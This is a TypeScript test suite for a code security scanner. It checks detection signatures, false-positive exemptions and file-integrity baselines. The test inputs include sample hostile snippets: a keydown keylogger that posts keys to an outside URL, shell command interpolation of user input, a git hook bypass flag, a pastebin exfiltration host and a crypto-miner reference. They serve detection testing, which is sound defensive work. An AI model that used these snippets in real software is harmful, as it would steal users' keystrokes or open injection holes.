// Scanner tests · every signature must fire on a genuine positive AND stay
// silent on a genuine negative. If a signature false-positives on legitimate
// NEX code, this test will catch it.

import { describe, it, expect, afterAll } from "vitest";
import { existsSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import * as path from "node:path";
import { scanContent, scanFile, scanDirectory, createBaseline, compareToBaseline, saveBaseline } from "../scanner";

const REPO_ROOT = process.cwd();
const FIXTURE_DIR = path.join(REPO_ROOT, "data", "nex-security", "__test-fixtures__");

function fixture(name: string, content: string): string {
  if (!existsSync(FIXTURE_DIR)) mkdirSync(FIXTURE_DIR, { recursive: true });
  const abs = path.join(FIXTURE_DIR, name);
  writeFileSync(abs, content, "utf8");
  return abs;
}

afterAll(() => {
  if (existsSync(FIXTURE_DIR)) rmSync(FIXTURE_DIR, { recursive: true, force: true });
});

describe("scanner · critical signatures fire on genuine positives", () => {
  it("flags eval() as critical", () => {
    const r = scanContent("src/lib/foo.ts", "export const x = eval('1+1');");
    const hit = r.hits.find((h) => h.pattern_id === "eval-call");
    expect(hit).toBeDefined();
    expect(hit?.severity).toBe("critical");
    expect(r.ok).toBe(false);
  });

  it("flags new Function() as critical", () => {
    const r = scanContent("src/lib/foo.ts", "const f = new Function('return 1');");
    expect(r.hits.some((h) => h.pattern_id === "function-constructor")).toBe(true);
    expect(r.ok).toBe(false);
  });

  it("flags known crypto-miner signature as critical", () => {
    const r = scanContent("src/lib/x.ts", "// this uses coinhive.min.js");
    expect(r.hits.some((h) => h.pattern_id === "crypto-miner-signature")).toBe(true);
    expect(r.ok).toBe(false);
  });

  it("flags keylogger pattern as critical", () => {
    const src = `document.addEventListener("keydown", (e) => fetch("http://x", { body: e.key }));`;
    const r = scanContent("src/lib/x.ts", src);
    expect(r.hits.some((h) => h.pattern_id === "keylogger-signature")).toBe(true);
    expect(r.ok).toBe(false);
  });
});

describe("scanner · warning signatures fire on genuine positives", () => {
  it("flags shell template interpolation as warning", () => {
    const src = "import { exec } from 'node:child_process';\nexec(`ls ${userInput}`);";
    const r = scanContent("src/lib/x.ts", src);
    expect(r.hits.some((h) => h.pattern_id === "shell-template-interpolation")).toBe(true);
  });

  it("flags --no-verify as warning", () => {
    const r = scanContent("scripts/deploy.sh", "git commit --no-verify -m 'x'");
    expect(r.hits.some((h) => h.pattern_id === "hook-bypass-flag")).toBe(true);
  });

  it("flags pastebin.com as warning", () => {
    const r = scanContent("src/lib/x.ts", "const url = 'https://pastebin.com/raw/abc';");
    expect(r.hits.some((h) => h.pattern_id === "known-exfil-host")).toBe(true);
  });

  it("flags large base64 payload as warning", () => {
    const b64 = "A".repeat(600);
    const r = scanContent("src/lib/x.ts", `const p = "${b64}";`);
    expect(r.hits.some((h) => h.pattern_id === "large-base64-blob")).toBe(true);
  });

  it("flags innerHTML with user input as warning", () => {
    const r = scanContent("src/lib/x.tsx", "el.innerHTML = req.body;");
    expect(r.hits.some((h) => h.pattern_id === "innerHTML-with-input-sink")).toBe(true);
  });
});

describe("scanner · info signatures fire without failing ok", () => {
  it("flags google-analytics but leaves ok=true", () => {
    const r = scanContent("src/lib/x.ts", "// uses google-analytics.com pixel");
    expect(r.hits.some((h) => h.pattern_id === "tracker-analytics")).toBe(true);
    expect(r.ok).toBe(true); // info-level does not fail
  });
});

describe("scanner · zero false-positives on legitimate NEX code", () => {
  it("does not flag legitimate child_process import", () => {
    const src = `import { spawn } from "node:child_process";\nconst p = spawn("npx", ["vitest"]);`;
    const r = scanContent("src/lib/nex-coding-team/test-runner.ts", src);
    expect(r.hits.filter((h) => h.severity !== "info").length).toBe(0);
  });

  it("does not flag non-ASCII characters (UTF-8 is fine)", () => {
    const src = "// unit tests · staircase · résumé · Ürsprung · éclair\nexport const label = '中文';";
    const r = scanContent("src/lib/x.ts", src);
    expect(r.hits.length).toBe(0);
  });

  it("does not flag legitimate innerHTML assignment from a constant", () => {
    const src = 'el.innerHTML = "<b>hello</b>";';
    const r = scanContent("src/lib/x.ts", src);
    expect(r.hits.some((h) => h.pattern_id === "innerHTML-with-input-sink")).toBe(false);
  });

  it("exempts test files that call eval intentionally", () => {
    const src = 'expect(() => eval("1+1")).not.toThrow();';
    const r = scanContent("src/lib/x/__tests__/x.test.ts", src);
    expect(r.hits.some((h) => h.pattern_id === "eval-call")).toBe(false);
  });
});

describe("scanner · scanFile / scanDirectory", () => {
  it("scanFile returns null for missing files", () => {
    expect(scanFile("src/lib/does-not-exist-xyz.ts")).toBe(null);
  });

  it("scanFile returns a valid result for existing files", () => {
    const abs = fixture("clean.ts", "export const x = 1;\n");
    const r = scanFile(abs);
    expect(r).not.toBeNull();
    expect(r?.ok).toBe(true);
    expect(r?.sha256.length).toBe(64);
  });

  it("scanDirectory aggregates hits across a tree", () => {
    fixture("bad.ts", "eval('x');");
    fixture("good.ts", "export const y = 2;");
    const r = scanDirectory("data/nex-security/__test-fixtures__");
    expect(r.files_scanned).toBeGreaterThanOrEqual(2);
    expect(r.critical_count).toBeGreaterThanOrEqual(1);
    expect(r.ok).toBe(false);
  });
});

describe("scanner · integrity baseline", () => {
  it("createBaseline captures sha256 for existing files", () => {
    const abs = fixture("integrity.ts", "export const z = 3;\n");
    const rel = path.relative(REPO_ROOT, abs).replace(/\\/g, "/");
    const baseline = createBaseline([rel]);
    expect(baseline.files.length).toBe(1);
    expect(baseline.files[0]?.sha256.length).toBe(64);
  });

  it("compareToBaseline detects modification", () => {
    const abs = fixture("drift.ts", "export const a = 1;\n");
    const rel = path.relative(REPO_ROOT, abs).replace(/\\/g, "/");
    const baseline = createBaseline([rel]);
    // Mutate the file after baseline.
    writeFileSync(abs, "export const a = 999;\n", "utf8");
    const drifts = compareToBaseline(baseline);
    expect(drifts.length).toBe(1);
    expect(drifts[0]?.kind).toBe("modified");
    expect(drifts[0]?.expected_sha256).not.toBe(drifts[0]?.actual_sha256);
  });

  it("compareToBaseline detects deletion", () => {
    const abs = fixture("delete-me.ts", "export const b = 1;\n");
    const rel = path.relative(REPO_ROOT, abs).replace(/\\/g, "/");
    const baseline = createBaseline([rel]);
    rmSync(abs, { force: true });
    const drifts = compareToBaseline(baseline);
    expect(drifts.length).toBe(1);
    expect(drifts[0]?.kind).toBe("deleted");
  });

  it("saveBaseline persists to disk", () => {
    const abs = fixture("persist.ts", "export const c = 1;\n");
    const rel = path.relative(REPO_ROOT, abs).replace(/\\/g, "/");
    const baseline = createBaseline([rel]);
    const saved = saveBaseline(baseline);
    expect(saved).toMatch(/data\/nex-security\/baselines\/baseline-/);
  });
});
